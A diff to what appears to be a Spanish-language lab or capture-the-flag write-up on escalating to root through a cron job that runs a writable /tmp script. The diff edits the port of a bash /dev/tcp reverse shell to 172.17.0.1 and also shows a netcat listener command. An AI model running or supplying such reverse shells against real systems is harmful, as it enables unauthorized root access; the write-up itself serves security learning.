@@ -88,5 +88,6 @@ Viendo la programación de crontab con ```crontab -l 2>/dev/null``` vemos que se
 vemos que este script ejecuta un archivo en ```/tmp/malicious.sh```, y nosotros tenemos acceso a editar ese archivo, por lo que podremos hacer una reverse shell con acceso a root escuchando en otra terminal en el cualquier puerto con ```nc -lvnp 443``` y copiando este script en ```/tmp/malicious.sh```
 ```
 echo '#!/bin/bash
-bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"' > /tmp/malicious.sh
+bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"' > /tmp/malicious.sh
 ```
+Una vez ejecutado, y esperando hasta máximo 60 segundos, en la terminal que estabamos escuchando habremos ganado acceso al usuario root
